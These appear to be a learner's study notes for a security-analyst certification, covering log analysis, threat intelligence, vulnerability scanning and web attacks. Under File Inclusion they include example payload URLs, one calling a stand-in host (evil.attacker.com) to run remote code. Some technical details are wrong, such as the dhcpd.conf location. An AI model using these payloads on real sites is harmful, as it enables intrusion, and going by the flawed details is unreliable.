10. **Unauthorized Access, Changes, and Privileges:** Unauthorized access to systems and devices, as well as use of privileges that result in unexpected changes, are a major cause for alarm. Unfortunately, the number and variety of systems, as well as the complexity of the user and permissions models in use in many organizations, can make monitoring for unauthorized activity challenging. Unauthorized privileges can be harder to track, particularly if they are not centrally managed and audited. Fortunately, tools like Sysinternals’s AccessChk can help by validating the access that a specific user or group has to objects like files, Registry keys, and services.
	 - *Registry Changes or Anomalies:*  Using run keys, the Windows Startup folder, and similar techniques is a common persistence technique. For systems with infrequent changes like servers, protecting the Registry can be relatively easily done through the use of application allow lists. In cases where Registry monitoring tools are not an option, lockdown tools can be used that prohibit Registry changes. When changes are required, the tools can be turned off or set into a mode that allows changes when patching Windows, and then turned back on for daily operations. For workstations where changes may be made more frequently, more in-depth control choices like an agent-based tool may be required to prevent massive numbers of false positives.
	 - *Unauthorized Scheduled Tasks:* Scheduled tasks, or cron jobs in Linux, are also a popular method for attackers to maintain persistent access to systems. Checking for unexpected scheduled tasks (or cron jobs) is a common part of incident response processes. To check scheduled tasks in Windows 10, you can access the Task Scheduler via Start ➢ Windows Administrative Tools ➢ Task Scheduler. Windows 11 changes this to Start ➢ Windows Tools ➢ Task Scheduler. You can detect unexpected scheduled tasks in Linux by checking cron. You can check crontab itself by using cat /etc/crontab, but you may also want to check `/etc/cron` for anything stashed there. Listing cron jobs is easy as well; use the crontab -l command to do so.
11. **Social Engineering:** Obfuscated links, or links that are intentionally deceptive, are a tool frequently used to fool users into clicking on malicious sites.

---
#### <u>Investigating Service and Application-Related Issues</u>
1. **Application and Service Monitoring:** Application and service monitoring can be categorized into a few common monitoring areas:
	- *Up/down:* Is the service running?
	- *Performance:* Does it respond quickly and as expected?
	- *Transactional logging:* Information about the function of the service is captured, such as what actions users take or what actions are performed.
	- *Application or service logging:* Logs about the function or status of the service.
	
	Each of these areas provides part of the puzzle for visibility into an application's or service's status, performance, and behavior. During an investigation, you will often need to identify behavior that does not match what the service typically logs.
2. **Application Logs:** Application logs can provide a treasure trove of information, but they also require knowledge of what the application’s log format is and what those logs will contain. While many Linux logs end up in /var/log, Windows application logs can end up gathered by the Windows logging infrastructure or in an application-specific directory or file.
3. **Introduction to new Accounts:** Attackers often attempt to create accounts in applications as part of their efforts to obtain and retain access. Both cloud-hosted and on-premises applications need to be logged and monitored to ensure that account creation is captured, and unexpected account creation results in alerts and reporting.
4. **Application and Service Anomaly Detection:** A variety of non-security-related problems can result in issues such as these:
	- Application or service-specific errors, including authentication errors, service dependency issues, and permissions issues
	- Applications or services that don’t start on boot, either because of a specific error or, in the case of services, because the service is disabled.
	- Service failures, which are often caused by updates, patches, or other changes
5. **Windows Service Status:** Windows service status can be checked either via the Services administrative tool (services.msc) or by using command-line tools like sc, the Service Controller application, which accepts command-line flags that set the start type for service, specify the error level it should set if it fails during boot, and provide details of the service. PowerShell also provides service interaction cmdlets like Start-Service to interact with services on local and remote Windows hosts.
6. **Linux Service Status:** Linux services can be checked on most systems by using the service command. service [servicename] status will return the status of many, but not all, Linux services. You can try the command to list the state of all services by running: `service –-status-all`. Linux systems that use *init.d* can be checked by running a command like: `/etc/init.d/servicename status`. Linux service restart processes vary depending on the distribution. Check your distribution to verify how it expects services to be restarted.
7. **Application Error Monitoring:** To check for application errors, you can view the Application log via the Windows Event Viewer. You can also centralize these logs using SCOM. Many Linux applications provide useful details in the /var/log directory or in a specific application log location. Using the tail command, you can monitor these logs while the application is tested. Much like Windows, some Linux applications store their files in an application-specific location, so you may have to check the application’s documentation to track down all the data the application provides.
8. **Application Behavior Analysis:** Applications that have been compromised or that have been successfully attacked can suddenly start to behave in ways that aren’t typical: outbound communications may occur, the application may make database or other resource requests that are not typically part of its behavior, or new files or user accounts may be created.
	- *Anomalous activity*, or activity that does not match the application’s typical behavior, is often the first indicator of an attack or compromise. Log analysis, behavior baselines, and filesystem integrity checking can all help detect unexpected behavior. User and administrator awareness training can also help make sure you hear about applications that are behaving in abnormal ways.
	- *Introduction of new accounts*, particularly those with administrative rights, are often a sign of compromise. Application account creation is not always logged in a central location, making it important to find ways to track both account creation and privileges granted to accounts. Administrative controls that match a change management workflow and approvals to administrative account creation, paired with technical controls, can provide a stronger line of defense.
	- *Unexpected output* can take many forms, from improper output or garbled data to errors and other signs of an underlying application issue. Unexpected output can also be challenging to detect using centralized methods for user-level applications. Server-based applications that provide file- or API-level output are often easier to check for errors based on validity checkers (if they exist!). This is another type of application error where user and administrator training can help identify problems.
	- *Unexpected Outbound Connections:* beaconing, outbound file-transfers, are common application exploitation indicators. Using network monitoring software as well as capable and well-tuned intrusion detection or prevention system monitoring outbound connection is crucial.
	- *Service interruption:* can indicate simple problem that requires server restart but also indicate a security issue like DDoS attack or compromised application. Monitoring tools should monitor application and service status as well as user experience to capture both views of how service is working.
	- *Application logs:* critical resource when investigating issue and as part of detection of potential problem. Knowing location of logs, what they contains, and what their contents mean is an important part of identifying and assessing IoC and malicious activities.

---
### 1.3 Given a scenario, use appropriate tools or techniques to determine malicious activity.
#### <u>Determining Malicious Activity Using Tools and Techniques</u>
1. **Logs, Log Analysis, and Correlation:** Analysts need to know how to quickly assess the organizational impact of an event and must determine if the event is localized or if it has a broader scope.
	- Know if other events are correlated with the initial event.
	- Understanding what systems, users, services, or other assets were involved or impacted.
	- Data classification for any data assets that are part of the event.
Analyzing data will also require the ability to sort through it, either using a security information and event management (SIEM) tool, through logging and aggregation technologies like Splunk or an ELK (Elasticsearch, Logstash, and Kibana) stack implementation, or using more manual techniques.

#### Types of Log:
1. **Event Log (Windows):** can be viewed directly from Windows Event Viewer. Contains Application, Security, Setup, and System Logs. Also works for AD.
2. **Syslog (Linux)**: location-> `/var/log`. Different programs may have Application specific directories for logs.
3. **Firewall Logs:** Typically identify the source and destination IP addresses. Also include data caused by triggers or rules.
4. **WAF Logs:** Operated in Application Layer to filter out attacks against web application. Default rulesets matches for OWASP top 10.
5. **Proxy Logs:** Proxies are used to either centralize access traffic or to filter traffic. Contains source, destination, date-time, and often content type. Unusual HEADER content of an HTTP request can be blocked.
6. **IDS and IPS Logs:** Relies on rules to identify unwanted traffic. Since, IPS and IPS systems often look into the contents of the packets (data), they can follow a conversation. This makes the log more detailed.

---
#### <u>Security Appliances and Tools</u>
1. **SIEM:** *Security Information and Event Management* tools leverage centralized logging and data gathering along with reporting and analysis capabilities to identify potential security issue. Now this information is combined with Threat information, IoC's data, threat feeds to identify issues. Also help with incident management and response capabilities, allowing tracking, management and oversight.
2. **EDR:** *Endpoint detection and response* tools are deployed to endpoint systems, using agents (small software programs) to monitor and detect potential security issue, attacks and compromises. EDRs focus on threat patterns and IoCs as well as behavioral analysis. It can automatically respond, either neutralizing threat, contain it or alerting users.
3. **SOAR:** *Security Orchestration Automation and Response* are used to integrate security tools and systems. They rely on APIs or other integration methods to gather data from security devices like firewalls, vulnerability scanners, antimalware tools, IDS and IPS devices, EDR and SIEM systems. Depends on playbooks and automated set of actions.

---
#### <u>Packet Capture</u>
1. **Wireshark:** Identifying malware on network through packet and protocol analysis relies on strong knowledge of what traffic should look like and what behaviors and contents are abnormal. Packet length, src, dst, ports and protocols are all useful information. Finding malware when content can't be seen due to encryption can be more challenging.
2. **Tcpdump:** CLI, can be used when wireshark is unavailable immediately. Simple tcpdump command to capture traffic on port 80: `tcpdump -i eth0 -s0 -v port 80`. `-s0`: This option sets the snapshot length to 0, which means that the entire packet will be captured, not just the headers.

---
#### <u>DNS and Whois reputation</u>
-> Organizations frequently rely on reputation services to help identify potential malicious domains and IP addresses. Public tools like **AbuseIPDB** allows us to search for IP addresses, domains, or networks to see if they have been reported. **Whois** tries to resolve IP address, domain name, and information including registration and contact information. Domain creation and registration update dates are also provided.

---
#### <u>Common Techniques:</u>
1. **Pattern Recognition:** the ability to identify common attacks, exploits and compromise patterns for what they are. AI and ML systems are commonly used to look for known patterns associated with compromise or malicious activity. One of the most common focuses for pattern recognition techniques is to identify C&C traffic or beaconing.

---
#### <u>Protecting and Analysing Email</u>
1. **Digital Signature:** When an email is digitally signed, a hash is created; then that hash is encrypted using sender's private key. Recipient can then validate the hash, they received with the email, and also decrypt it using sender's public key.
2. **DKIM (Domain Keys Identified Mail):** allows organization to add content to messages to identify them as being from their domain. DKIM signs both the body and the headers of the mail, which ensures that the message is actually from the organization it claims to be. It adds a DKIM-Signature header, which can be checked against the public key stored in public DNS entries for DKIM-enabled organization. When you (the sender) send an email, your mail server uses a **private key** (a secret only your domain knows) to generate a **digital signature**.
3. **SPF (Sender Policy Framework):** is an email authentication technique that allows organization to publish a list of their authorized email servers. SPF records are added to DNS information for your domain, and they specify which servers are allows to send mail from that domain.
4. **DMARC (Domain Based Message Authentication, Reporting, and Conformance):** is a protocol that uses **DKIM** and **SPF** to determine whether a message is authentic. Like SFP and DKIM , DMARC records are published in DNS, but unlike SPF and DKIM, DMARC can be used to determine whether to accept a message from sender. Using, DMARC, you can choose to reject or quarantine message that are not sent by a DMARC-supporting sender.

---
#### <u>Sandboxing</u>
1. **Joe Sandbox**, a commercial sandbox service with a free basic option that can test against multiple operating systems as well as allowing advanced options using a set of parameters and options called a cookbook.
2. **Cuckoo**, an automated malware analysis tool that can run as a **self-hosted** tool. It also analyses PDFs; MS Office files and other files; and malicious websites.

Both tools will analyze network traffic and calls to APIs as well as other actions taken by
the artifacts that they analyze.

---
#### <u>User Behavior Analysis</u>
-> Abnormal account activity depends on:
- a user is unlikely to attempt to use administrative rights.
- login outside of typical office hours, or from another country in many cases.

These baselines are configured based on common norms.

---
#### <u>Programming Languages:</u>
1. **PowerShell:** To run a PowerShell script on Windows, **execution policy** needs to be changed.
	- **Restricted** is default, it blocks all use of PowerShell script.
	- **AllSigned** requires any PowerShell script that you run are signed by a trusted publisher.
	- **RemoteSigned** allows execution of PowerShell script that you write on your local machine, but requires the script downloaded from the internet be signed by trusted publisher.
	- **Unrestricted** allows execution of any PowerShell script locally written, but prompts you to confirm the your request before allowing you to run the a script if downloaded from the internet.
	- **Bypass Allows** allows execution of any PowerShell script, and does not produce any warning for scripts downloaded from the internet.
	To change execution policy, e.g. `Set-ExecutionPolicy RemoteSigned`

#### <u>Data Formats</u>
1. **JSON:** JavaScript notation and human-readable text for data interchange.
2. **XML:** markup language with similar purpose, it is both human and machine-readable. It has broader application than JSON does.

---
### 1.4 Compare and contrast threat-intelligence and threat-hunting concepts.
#### <u>Threat Data and Intelligence</u>
1. **Open Source Intelligence** is threat intelligence acquired by publicly available sources. Challenge is around deciding which source is reliable and up-to-date.
	- **Government Sites:** The U.S. Cybersecurity and Infrastructure Security Agency (CISA), The U.S. Department of Defence Cyber Crime Centre, The CISA’s Automated Indicator Sharing (AIS)
	- **Vendor Website:** Microsoft, CISCO, etc.
	- **Public Sources:** The SANS, VirusShare - contains details about malware uploaded to VirusTotal.
	- **Social Media:** timely but difficult to determine origin of information. Less trustworthy, can take significant time and resources to validate authenticity.
	- **Blogs and forums:** less commonly used. More in-depth analysis and discussions.
	- **Computer Emergency Response Team (CERT) and Cybersecurity Incident Response Team (CSIRT):** provide public information via their websites and social media feeds. Particularly useful identified industry aligned organizations are identified, as they may face similar threats to those that your organization deals with.
	- **Dark/Deep Web:** validating the information can be challenging, but visibility directly in the conversation and data from threat actors can be incredibly valuable and timely. 
2. **Proprietary and Closed Source Intelligence** is doing your own information gathering and research, maybe with custom tools, analysis models, or other proprietary. They may share information with others as part of an information sharing agreement or organization, as *paid feeds*, or they may keep the intelligence for internal use only. Validating threat data and overwhelming amount of threat data in open is a problem, it is the reason why some organizations pay for high-quality threat feed.
3. **Assessing Threat Intelligence:** important to determine confidence level of the data.
	Depends on three things: **timeliness, relevancy** and **accuracy**. Confidence scores are associated with data which justifies its confidence level.

---
#### <u>Threat Intelligence Sharing</u>
-> Shared threat intelligence allows for faster response and better behavioural detection capabilities and make intelligence sharing community more resilient.

**Five** areas for the use of **Threat Intelligence Sharing:**
1. **Incident response:** Knowing what a threat actor is likely to deploy and how they commonly use their tool and technique can make target identification, response planning, and clean-up significantly easier.
2. **Vulnerability Management:**  Understanding current active threats can help security professional to better access risk and influence path cycle and prioritization efforts.
3. Risk Management
4. to **Influence Security Engineering:** Security Engineering focuses on both current and future needs, threat intelligence can provide a useful view of threats and what threats are likely to grow over the life cycle security design.
5. as a part of **Detection and Monitoring efforts:** reply heavily on threat intelligence information to allow timely updates and for creation on new detection rules.

---
#### <u>Standard-Based Threat Information Sharing</u>
Two markup languages for managing threat information: **STIX** and **OpenIOC**.
- Structured Threat Information Expression (**STIX**): is an XML originally sponsored by US Department of Homeland Security. **STIX 2.0** is in a **JSON** description.
- A companion of **STIX** is Trusted Automated Exchange of Indicator Information (**TAXII**) protocol. **TAXII** is intended to allow cyber threat information to be communicated at the application layer via HTTPs. **TAXII** is specifically designed to support **STIX** data exchange.
- Like STIX **OpenIOC** is an XML-based framework.

---
#### <u>The Intelligence Cycle</u>
1. **Requirements Gathering:** access what security breaches or compromises you have faced; access what information could have prevented or limited the impact of breach; access what controls and security measures were not in place that would have mitigated the breach.
2. **Data Collection:** Once we have our information requirements, we can collect data from threat intelligence sources to meet those requirements.
3. **Data Processing and Analysis:** Data collected will be in different formats. In this stage we must process the data to allow to be consumed by whatever tools or processes we intend to use.
4. **Intelligence Dissemination:** Data is distributed to leadership and operational personnel who will use the data as part of their security operation role.
5. **Feedback:** Continuous improvement is a critical element in the process, and it should be used to create better requirements and to improve the overall output of threat intelligence program.

---
#### <u>Threat Actors</u>
- **Nation-state:** the most access to resource, tools, talent, equipment and time. Often associated with Advanced Persistent Threat (APT).
- **Organized crime:** for financial gain. E.g. Ransomware.
- **Hacktivist:** activists who use hacking as a mean to political or philosophical end. Ranges from individual actor to large groups.
- **Script Kiddie:** actors who use pre-existing tools, often in relatively unsophisticated ways.
- **Insider Threat:** actors who are employees or other trusted individuals or a group inside an organization. They may be **unintentional** or **intentional**. Can pose significant threat due to the trusted position they have.
- **Supply Chain:** actors either part of the supply chain, inserting malicious software or hardware, compromising devices or inserting backdoors, or may attack the supply chain, disrupting the ability to obtain goods and services. 

---
#### <u>Tactics, Techniques, and Protocol (TTP)</u>
-> APTs are most concerning attackers that an organization can face. As APTs have been studied, they are identified and classified based on their *tactics, techniques, and procedure*.
- **Proactive Threat Hunting:** Searching for threats proactively rather than reactively can help stay ahead of attackers.
- **Configurations** and **misconfigurations** that may lead to compromise or that may indicate that an attacker has modified settings.
- **Isolated networks** are typically used to protect sensitive or specialized data and systems. Threat hunting in a isolated network can be easier because traffic and behaviour are all understood, but in some cases that also mean that deploying centrally managed tools are difficult (lack of connection, air-gap, restricted data flow, etc.).
- **Business-critical assets** and process are the focus area due to their intelligence. Threat hunters are likely to focus on these due to organizational risk profile and the importance of ensuring that remain secure.

---
#### <u>Indicator of Compromise</u>
-> IoCs are used to detect breaches, compromises and malware as well as other activities associated with attacks.
1. **Collection:** focuses on how to acquire data that may indicate compromise. This focuses on using tools, logs, and other data sources.
2. **Analysis:** need to determine if the information gathered actually indicated compromise. Analysis requires understanding of what the data means and contextual understanding of whether it is likely to mean a compromise has occurred or has been attempted.
3. **Application of IoCs:** i) through analysis to understand if compromise has occurred, thus activating IR procedures. ii) Threat intelligence and sharing groups can document IOCs and make them available for security monitoring and analysis tools.

-> Common IOCs are:
1. Questionable login activity, at odd hours, from dormant account, or from odd countries or geo location.
2. Modification to files, particularly configuration files and log files.
3. Unexpected or unusual use of privileged accounts.
4. Unusual or unexpected network traffic.
5. Large outbound data transfer.
6. Unexpected services, ports, or software running on systems or devices.

---

#### <u>Threat Hunting Tools and Techniques</u>
- **Active defence:** involves deception techniques that either delay or confuse attackers.
- **Tarpit:** provide attackers with large number of fake targets that both provide false data and slow down scans and attacks are common component in active defence.
- **Honeypots:** intentionally vulnerable systems that are used to lure attackers in. They are instrumented to have logging enabled to allow threat analysts and other security professionals to review and analyse attacker and tool behaviours and techniques.

---
### 1.5 Ffficiency and process improvement in security operations
1. **Standardize Process and Streamline Operation:** reduces the amount of effort required to react to a task. No longer need to figure out what to do next when task comes up - simply turn to the playbook for the standardised process and carry out the steps already though through. Do not require human interaction.
2. **Cybersecurity Automation:** SOAR platform provide opportunities to automate security tasks that cross between multiple systems. SOAR also allow to combine information received through multiple thread feed develop a comprehensive picture of security posture. By bringing information to SOAR platform, data about ongoing incidents can be improved and reaction to emerging threats can be better.
3. Besides SOAR, **scripting**, which is writing code that automates our work, and **integration** which uses vendor provided interfaces to tie different products together.
4. **API** (*application programmable interfaces*) allows us to interact with service without web-based interfaces. APIs are used to automate the provisioning of cloud resources, to retrieve logs from remote services, and automate many other routine tasks.
5. **Webhooks** allows us to send a signal from one application to another using a web request. E.g., webhook action in threat intelligence platform that sends request to the vulnerability scanner's API each time a new vulnerability is reported.
6. **Plugins** are small programs that run inside of other programs, adding additional functionality.
   > Ultimate goal of of cybersecurity is to achieve a *single glass of pane* approach to security operation. In this philosophy, cybersecurity analysts integrate all their tool in a single platform, so they can use one single interface to perform al their work.

---
# 2. Vulnerability Management
#### <u>Mapping, Enumeration, and Asset Discovery</u>
-> Discovery process are used as a part of asset management, where they can be used as  asset discovery. Even well-managed organization often find that devices have been moved between locations or have been added without proper process and authorization.
1. **Active Reconnaissance:** uses host scanning tools to gather information about systems, services, and vulnerabilities. It is important to note that although reconnaissance does not involve exploitation, it can provide about vulnerabilities that can be exploited.
2. **Map Scan:** Active scan can also provide information about network design and topology. Tester can take an educated guess about the topology of the network based on the TTL (time-to-live) of the packet received, traceroute information, and responses from network and security devices. Firewalls can make devices invisible to scan.
3. **Pinging host:** Ping communication take place using the Internet Control Message Protocol (ICMP). `hping -p 80 -S <IP>`. Ping takes place from port 80 as it is also used by web servers.

---
#### <u>Port Scanning and Service Discovery Techniques and Tools</u>
1. **Port scanner** have a number of common features:
	1. Host Discovery
	2. Port Scanning and service identification
	3. Device fingerprinting
	4. Service version identification
	5. Operating system identification
- Ports 0-1023 are referred as *well-known-ports*. 1024-49151 are *registered ports* and are assigned by the Internet Assigned Numbers Authority (IANA) when requested. **-P0** flag tells nmap to skip pinging the system before scanning.
2. **OS and Device Fingerprinting:** Ability to identify an operating system based on the network traffic that is sends is *OS fingerprinting*. *Device fingerprinting* in this context describes the collection and correlation of information about a device like the software, services, and operating system it runs that allows it to be uniquely identified, or to be identified as a specific type or version of the device. Useful for identifying printers and other networked devices. 
3. **Tools:**
   - **Angry IP Scanner:** multiplatform port scanner, with GUI. Unlike nmap, does not provide detailed identification for service and operating systems, but different modules known as *fetchers* can give specific information about an IP.
   - **Maltego:** open-source, focuses on open source intelligence gathering and connecting data points together via GUI.
   - **Metasploit:** metasploit framework (MSF), is a penetration testing framework. Includes several modules for a broad range of functionality, including scanning, web-app vuln scanning, etc.
   - **Recon-ng:** Uses CLI with module selection and installation capabilities that allows us to configure and use it to fit our needs. Uses a module marketplace, for OSINT.

---
#### <u>Passive Discovery</u>
-> Passive analysis relies on information that is available about the organization, systems, or network without performing our own probes. It relies on logs and other existing data, which may not provide all the information needed to fully identify target.


| Level | Level name    | Example                        |
| ----- | ------------- | ------------------------------ |
| 0     | Emergencies   | Device shutdown due to failure |
| 1     | Alerts        | Temperature limit exceeded     |
| 2     | Crititcal     | Software failure               |
| 3     | Errors        | Interface down message         |
| 4     | Warning       | Configuration change           |
| 5     | Notifications | Line protocol Up/Down          |
| 6     | Information   | ACL Violation                  |
| 7     | Debugging     | Debugging messages             |
1. **Netflow:** is a cisco network protocol that collects IP information, allowing traffic monitoring. Used to provide a view of traffic flow and volume. Can help identify service problems and baseline typical network behaviour and can also be useful in identifying unexpected behaviours.
2. **Netstat:** contains localhost network information, available in unix-like OS as well as windows. `netstat -ta` : all TCP connections. `-u` : all UDP connections. `-w` shows RAW, and `-X` shows Unix socket connections. `-o` to identify process number, which can then be referred by Windows Task Manager or Process information. `-e` for ethernet statistics. `-nr` : Route table information including IPv4 and IPv6.
3.  **DHCP Logs and DHCP Server Configuration Files:** Dynamic Host Configuration Protocol (DHCP) is a client/server protocol that provides an IP address as well as information such as default gateway and subnet mask for the network segment that the hosts will reside on. In Linux `dhcpd.conf` files provides such information. Configuration files are under `/etc` directory and `dhcpd.conf` is at `/var/log/dhcpd.conf`. Can also be viewed using `journalctl` command in Linux.
4. **Firewall Logs and Configuration Files:** Contains information about both successful and blocked connections. Analysing router and firewall ACL and logs can provide useful information, also help with topology mapping by identifying where systems are based on traffic allowed and blocked. FW logs allow Red Team to reverse-engineer firewall rules based on the contents of the logs.
5. **System Log Files:** collected by most systems to provide troubleshooting and other system information, typically in `/var/log`. Types of logs:
   - *Application log:* containing events logged by programs and applications. Logged content varies from program to program.
   - *Security log:* captures login events, resources and rights usage, and events like being opened, created, or deleted.
   - *Setup log:* captured when applications are set up.
   - *System log:* events logged by windows components.
   - *Forwarded event log:* set up using event subscription and contains event collected from remote computers.
6. **DNS Zone Transfer:** A domain typically has a primary (master) DNS server that holds the original DNS records for that domain. It might also have secondary (slave) DNS servers that hold copies of these records. This redundancy ensures that if the primary server goes down, the domain can still function. A zone file obtained through a zone transfer can reveal: Hostname, IP Addresses, Internal Network Structure, and other records.

---
#### <u>Identifying Vulnerability Management Requirements</u>
1. **Regulatory Environment:** Organizations are bound by laws and regulations that governs the way they store, process, and transit different types of data. This is especially true when the organization handles sensitive personal information or information belonging to government agencies. E.g., **HIPAA** -> Health Insurance Portability and Accountability Act. **PHI** -> Protected Health Information (for business associates). **GLBA** -> Gramm-Leach-Bliley Act (financial institutions handling financial records)
2. **PCI DSS**: Payment Card Industry Data Security Standard, for merchants who handle credit card transactions and service providers who assist merchants with these transactions. Internal and External vulnerability scans are requires. At least once every three months (quarterly), and after any significant changes. External scans must be conducted by Approved Scanning Vendors (ASV) authorized by PCI DSS.
3. **Centre of Internet Security (CIS):** publishes a series of security benchmarks that represent the consensus opinion of a series of matter experts. The benchmarks provide detailed configuration instructions for a variety of operating systems, applications , and devices. These industry security benchmarks provide organizations with a great starting point for their own system configuration efforts.
4. **OWASP:** Open Web Application Security Project, a broad community of developers and security practitioners, it hosts many community-developed standards, guides, and best practice documents, as well as multiple open-source tools.
5. **Scheduling Scans:** Vulnerability Scanning tools allow the automated scheduling of scans to take the burden off administrators. Their scans can produce automated email reports of the scan result. Factors influencing how often organization decides to conduct test:
    - *Risk Appetite:* its willingness to tolerate risk within environment.
    - *Regulatory Requirements:* may dictate a minimum frequency for scans. These requirements may also come from corporate policies.
    - *Performance constraints:* scanning system may be capable of performing a limited scans per day.
    - *Operation constraints:* may limit resource-intensive scans during period of high business activity.
    - *Licensing limitations:* may curtail the bandwidth consumed by the scanner or the number of scans that can be conducted simultaneously.

---
#### <u>Configuring and Executing Vulnerability Scans</u>
1. **Scoping:** What systems and networks, technical measures, and test performed against discovered systems. Through the use of network segmentation and other techniques, systems involving credit card processing can be isolated. This segmentation reduces the scope of PCI DSS compliance to much smaller isolated network region.
2. **Sensitivity level:** Unnecessary plugins must be unselected before scan to minimize false positive and false negative in the scans.
3. **Supplementing Network Scans:** Credential scans are agentless scans. Agent-based vulnerability scanning installs smalls agents in the targets which reports back to the vulnerability management platform after performing scans respectively.
4. **Scan Perspective:** Compared to external scans, internal scans provide the view that a malicious insider might encounter. Scanners located inside datacentre and agents located in servers offer the most accurate view of the real state of the server by showing vulnerabilities which might be blocked by other security controls on the system, e.g. FW, network segmentation, IDS, IPS, etc.
5. **Security Content Automation Protocol (SCAP):** standardized approach for communicating security-related information. **CVE** (Common Vulnerabilities and Exposures) nomenclature for describing security-related software flaws. **CVSS** (Common Vulnerability Scoring System) provides standardized approach for measuring and describing the severity of security-related flaws.

---
#### <u>Developing a Remediating Workflow</u>
Vulnerability Management Cycle: Testing -> Detection -> Remediation
1. **Continuous Scanning:** Organizations should begin their continuous scanning program by conducting baseline security scanning that gives them the initial snapshot of their environment. They can use ongoing scans to detect deviations from the baseline.
2. **Factors for remediation prioritization:**
	- Criticality of the system and Information Affected by the Vulnerability.
	- Difficulty of Remediation.
	- Severity of Vulnerability.
	- Exposure of Vulnerability.
3. Before deploying remediation activity, planned fixes should be thoroughly tested in a sandbox environment to prevent unforeseen side effect of fixes.
4. **Delayed Remediation Options:** *Compensation Control*, additional security measure to address vulnerability without remediating underlying issue. Secondly, decide that the risk is acceptable and continue with the business.

---
#### <u>Overcoming Risks of Vulnerability Scanning</u>
1. **Service Degradation:** Vulnerability scans consume bandwidth and tie up the resources with the targets of scans. Risk increases when scans involve legacy systems or proprietary systems that might exhibit unpredictable behaviour.
2. **Customer Commitments:** Memorandums of understanding (MOUs) and service-level agreements (SLA) with customers create expectation s related to uptime, performance and security that the organization must fulfill.

---
#### <u>Infrastructure Scanning Tools</u>
1. **Tenable's Nessus**: network vulnerability scanning product, one of the earliest.
2. **OpenVAS:** is a *open-source* free alternative to commercial scanners.

---
#### <u>Cloud Infrastructure Assessment Tools</u>
1. **Scout Suite:** multi-cloud auditing tool, reaches into user's accounts with cloud service providers and retrieves configuration information using those services' APIs. Capable of auditing accounts with AWS, Microsoft Azure, Google Cloud Platform, Alibaba Cloud, and Oracle Cloud Infrastructure.
2. **Pacu:** is not a vulnerability scanning tool but rather a cloud-focused exploitation framework. Specifically for AWS accounts, designed to help attacker what they can do with the current AWS account.
3. **Prowler:** is a security configuration testing tool, similar to Scout Suite. Perform deeper test but is limited to AWS, GCP and Azure.

---
#### <u>Web Application Scanning Tools</u>
1. **Nikto:** open-source, CLI based.
2. **Arachni:** open-source, available for Windows, MacOS and Linux, GUI based.
3. **Interception Proxies:** runs on tester's system and intercept requests being sent from web-browser to webserver before they are released onto network, and vice-versa. Allows tester to manually manipulate requests.
	- **ZAP:** Zed Attack Proxy, community development project coordinated by OWASP.
	- **Burp Suite:** from PortSwigger

---
#### <u>Validating Scan Results</u>
1. **False Positives:** Vulnerability that does not exits is called *false positive error.*
	-  Vulnerability Scanner reports a vulnerability: *positive report*. If accurate: *a true positive report*. If inaccurate *a false positive report**.
	- Vulnerability Scanner reports a vulnerability not present: *negative report*. If accurate: *true negative report*. If inaccurate: *false negative report.*
2. **Context Awareness:** specific context of the organization and the environment must also be factored in. E.g. vulnerability on system directly connected to internet is more severe than one found in the intranet.

---
#### <u>Common Vulnerabilities</u>
1. **End-Of-Life (EOL):** Eventually vendor stops providing security patches or investigation to correct security flaws.
2. **Buffer Overflow:** An attacker manipulates a program into placing more data into the memory than allocated by the programmer.
3. **Insecure Design:** Using older protocols with weak encryption algorithms.
4. **Insecure Cipher Use:** SSL/TLS are not cryptographic algorithms, but are the protocols that describe how cryptographic ciphers must be used to secure network communications. SSL/TLS protocol helps client and server agree on a mutually acceptable cipher.
5. **Certificate Problem:** SSL/TLS use digital certificate to identify servers and exchange cryptographic keys. Mismatch between the Name on the Certificate and the Name of the Server is very serious, this means someone is using a fake certificate stolen from another server. Moreover, certificates can be expired or signed from an unknown CA.

---
#### <u>Web Application Vulnerabilities</u>
1. **Cross-Site Scripting:** embedding scripting commands on a website that will later be executed by an unsuspecting visitor accessing the site.
	- **Persistent XSS:** attacker is able to actually store the attack code on the server.
	- **Reflected XSS:** attacker tricks a user into sending the attack to the server as part of query string or other command. The server then sends the attack back to the user (reflecting it), causing code to execute.
2. **File Inclusion:** takes directory traversal to next level. Instead of simply retrieving a file from the local OS and displaying it to the attacker, file inclusion attacks actually execute the code contained within a file.
	- **LFI:** Local FI, execute code stored in a file located elsewhere on the webserver.
		http://www.mycompany.com/app.php?include=C:\\www\\uploads\\attack.exe
	- **RFI:** Remote FI, execute code that is stored on remote server.
		http://www.mycompany.com/app.php?include=http://evil.attacker.com/attack.exe
3. **Request Forgery:** attacker exploits trust relationship and attempt to have users unwittingly execute commands against a remote server.
	- **CSRF / XSRF:** XSS exploits the trust that remote sites have in a user's system to execute command on the user's behalf. While, XSRF works by making assumption that user is logged into multiple sites at the same time. When user clicks the link on the *first* site, they are unknowing sending a command to *second* site.
	  One way to protect against XSRF is to use secure tokens that the attacker would not know to embed in the links.
	  - **SSRF:** trick server into visiting a URL based upon user-supplied input. Possible where server has access to non-public URLs, and also the server accepts URLs from user input.

---
#### <u>Identification and Authentication Failures</u>
1. **Password Spraying:** using list of common passwords and attempt to log in into many different user accounts with those common passwords.
2. **Credential Stuffing:** using list of passwords and usernames that were stolen in the compromise of one website and uses them to attempt to gain access to a different, potentially unrelated website.
3. **On-Path Attack / MitM:** attacker is able to interfere in the communication flow between two systems.
4. **Session Hijacking:** taking over already existing user either by stealing session keys or cookies user by the remote server.
5. **Data Poisoning:** attacks trying to manipulate the training data set of a ML in way to cause ML algorithm to create inaccurate models.

---
#### <u>Analyzing Risks</u>
1. **Threat:** any possible events that might have an adverse impact on CIA triad.
2. **Vulnerabilities:** weakness in the system by a threat.
3. **Risks:** intersection of threat and vulnerability.
<img width="604" height="398" alt="Pasted image 20250518124328" src="https://github.com/user-attachments/assets/6cb29e25-5f0b-4616-97c0-e1ae864d3148" />

1. **Business Impact Analysis (BIA):** formalized approach to risk prioritization that allows organizations to conduct their reviews in a structured manner.
	- **Quantitative risk assessment:** numeric data for prioritization, straightforward prioritization.
	- **Qualitative risk assessment:** subjective judgement, allows assessment of risks difficult to quantify.
	
- **Quantitative Risk Calculations:**
	- **Asset Value (AV):** cost to acquire, replace, depreciated cost of the asset, depending on preference. Expressed in money. (e.g. $500)
	- **Annualized Rate of Occurrence (ARO):** Likelihood of risk. It is the No. of times risk is expected each year. *A risk that is expected twice a year has ARO of 2*.
	- **Exposure Factor (EF):** amount of damage that will occur to the asset if risk is materialized. Expressed in percentage of the asset. *Risk that would damage half the asset has RF of 50%*
	- **Single Loss Expectancy (SLE):** amount of financial damage each time risk materializes. Expressed in money. `SLE = AV * EF`
